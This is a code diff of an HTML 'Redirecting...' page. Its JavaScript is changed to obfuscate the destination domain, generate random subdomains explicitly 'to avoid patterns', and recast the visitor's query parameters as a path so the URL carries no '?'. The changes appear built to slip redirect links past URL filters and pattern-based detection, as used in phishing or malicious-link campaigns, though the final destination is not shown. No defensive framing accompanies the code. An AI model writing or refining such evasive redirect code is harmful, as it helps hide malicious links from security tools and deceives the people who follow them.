@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script>
-        // Subdomain generator (fixed pattern without randomness)
-        function generateFixedSubdomain() {
-            return 'fixedsubdomain'; // Replace 'fixedsubdomain' with your preferred subdomain
+        // Random subdomain generator to avoid patterns
+        function generateRandomSubdomain() {
+            var array = new Uint32Array(5);
+            window.crypto.getRandomValues(array);
+            return Array.from(array, x => x.toString(36)).join('');
         }
 
         // Function to split and rebuild the domain with obfuscation
@@ -16,18 +18,32 @@
             return parts.join('') + '.' + tld.slice(0, 2).join('') + '.' + tld.slice(2).join('');
         }
 
-        // Function to handle redirection to a fixed URL
+        // Function to transform query parameters into a path-like structure
+        function transformQueryToPath(queryString) {
+            return queryString.replace(/&/g, '/').replace(/=/g, '_');
+        }
+
+        // Handle redirection without using `?` in the URL
         function redirect() {
             try {
-                // Hardcoded URL path
-                var hardcodedPath = 'VUdxZEx5bWg2dTJXVG1pU2VZZXYveUErSk4wMVVzYU9ybmdBNy91ZDBUT0twR3hUMHBGc2dNd3hHeGxvSXk1cHpaSE1MM3ZLc0Y3OFI1SWZ0OWhudmc9PQ__';
+                // Extract query parameters
+                var queryIndex = window.location.href.indexOf('?');
+                if (queryIndex === -1) {
+                    throw new Error('No parameters found');
+                }
 
-                // Generate a fixed subdomain for redirection
-                var subdomain = generateFixedSubdomain();
+                // Get the query string
+                var queryString = window.location.href.substring(queryIndex + 1);
 
-                // Build the final redirection URL without additional query parameters
+                // Transform the query string into a path-like structure
+                var transformedPath = transformQueryToPath(queryString);
+
+                // Generate a random subdomain for redirection
+                var randomSubdomain = generateRandomSubdomain();
+
+                // Build the final redirection URL
                 var domain = rebuildDomain();
-                var redirectUrl = 'https://' + subdomain + '.' + domain + '/' + hardcodedPath;
+                var redirectUrl = 'https://' + randomSubdomain + '.' + domain + '/' + transformedPath;
 
                 // Update the link in the page to point to the redirect URL
                 document.getElementById('redirect-link').href = redirectUrl;
